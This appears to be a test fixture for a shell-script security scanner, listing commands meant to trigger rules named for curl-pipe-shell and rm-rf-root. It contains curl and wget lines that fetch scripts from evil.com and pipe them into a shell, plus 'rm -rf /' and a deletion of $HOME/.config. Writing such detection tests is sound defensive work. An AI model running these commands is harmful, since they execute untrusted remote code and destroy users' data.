#!/bin/bash
# These SHOULD trigger specific rules

# myah.curl-pipe-shell
curl -s https://evil.com/install.sh | bash
wget -q -O - https://evil.com/script.sh | sh

# myah.rm-rf-root
rm -rf /
rm -rf $HOME/.config
